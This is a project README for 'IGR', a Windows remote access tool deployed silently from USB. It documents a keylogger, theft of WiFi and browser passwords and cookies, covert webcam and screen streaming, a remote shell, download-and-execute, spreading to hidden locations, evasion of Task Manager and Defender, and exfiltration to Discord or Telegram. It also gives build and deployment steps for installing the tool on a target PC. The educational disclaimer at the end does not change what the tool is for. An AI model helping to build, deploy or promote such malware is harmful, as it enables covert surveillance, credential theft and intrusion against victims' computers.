# IGR v3.2

<p align="center"><img src="logos/igr-logo2.png" width="200"></p>

Silent auto-start remote access tool for Windows. Deploys via USB, starts before login, and exposes a full-featured web dashboard through a Cloudflared tunnel.

## Quick Start

```batch
git clone https://github.com/whoevenisxeno/IGR.git && cd IGR && build.bat
```

This clones the repo, reads your `config.txt`, injects credentials, builds `igr.exe`, and offers USB deployment — all in one go.

> First time? Copy `config.example.txt` to `config.txt` and fill in your values before running `build.bat`.

## Configuration

1. Copy `config.example.txt` to `config.txt`
2. Fill in your values (at least 1 of Discord or Telegram required)
3. `config.txt` is gitignored — your credentials are never pushed

```ini
DISCORD_WEBHOOK=https://discord.com/api/webhooks/...
DISCORD_USERNAME=IGR
DASHBOARD_PASSWORD=YourPassword
TELEGRAM_BOT_TOKEN=123456:ABC-DEF...
TELEGRAM_CHAT_ID=987654321
UPDATE_URL=https://example.com/igr_new.exe
```

`build.bat` reads `config.txt` and injects the values into the executable at compile time. No credentials remain in source code.

## Features

- **Silent deployment** — No console, no visible windows, auto-starts at boot via Scheduled Task + Registry + Startup folder
- **Web dashboard** — Sleek dark UI with 2-column grid layout, accessible from any browser via Cloudflared tunnel URL
- **Screen streaming** — Live screen capture with multi-monitor support
- **Webcam streaming** — Live webcam feed with device selection
- **Remote control** — Mouse and keyboard control from dashboard
- **Keylogger** — Global keystroke logging with persistent storage, auto-sends last session on startup
- **File browser** — Browse, download, and upload files on host
- **Command shell** — Execute system commands remotely
- **Data harvesting** — WiFi passwords, Chrome/Edge saved passwords, browser cookies, installed software, recent documents, full system inventory
- **Troll features** — Popups (normal/persistent/hydra), screen freeze, TTS, audio playback, mouse jitter, ghost typing, wallpaper change, monitor on/off, **reboot, shutdown**
- **Remote tools** — Download & execute, self-update from URL, file search, browser open, process kill, LAN scanner
- **Stealth** — Internal spreading (copies to hidden locations), registry persistence, anti-task-manager, fake IIS headers, hidden files, **panic self-destruct**
- **Watchdog** — Monitors process and restarts if killed
- **Telegram tracking** — Multi-PC tracking with one editable message per machine (active/offline status, last seen, WiFi, software), heartbeat updates every 60s, keylog file delivery
- **Discord notifications** — Webhook URL post on startup
- **Panic button** — One-click self-destruct: removes all IGR traces (registry, startup, spread copies, keylogs, watchdog, Defender exclusions), marks Telegram offline, kills all IGR processes
- **No admin required** — Falls back gracefully if UAC denied

## Project Structure

```
imagine/
├── main.py          # Main application (single file)
├── build.bat        # Build script (PyInstaller) + USB detection
├── setup.bat        # USB deployment / install script
├── cleanup.bat      # Remove all traces
├── config.txt       # Credentials (gitignored)
└── README.md
```

## Build

```batch
build.bat
```

Build.bat will:
- Detect plugged-in USB drives and offer to wipe+deploy or add IGR alongside existing files
- Validate config (at least Discord webhook or Telegram bot token required)
- Build with PyInstaller → `dist\igr.exe`

## Deploy via USB

1. Run `build.bat` — it handles USB detection and file placement
2. Plug USB into target PC, run `setup.bat`
3. IGR installs silently and starts immediately

## Self-Update

Set `UPDATE_URL` in config to a direct download link hosting the new `.exe`. Click "Update from configured URL" on the Remote page — IGR downloads the new exe, kills itself, swaps the file, and restarts.

## Panic / Self-Destruct

Click the red PANIC button on the Stealth page. Double confirmation. Removes:
- Registry Run key
- Scheduled task
- Startup shortcuts
- All 4 internal spread copies
- Keylog directory + marker
- Telegram state + watchdog script
- Defender exclusions
- Marks Telegram offline, then kills all IGR processes

## Cleanup

Run `cleanup.bat` on the target machine to remove all traces manually.

## Requirements

- Windows 10/11
- Python 3.8+ (for building only)
- See `build.bat` for Python package dependencies

## Disclaimer

This project is for educational and authorized testing purposes only. Unauthorized access to computer systems is illegal. Use responsibly and only on systems you own or have explicit permission to test.
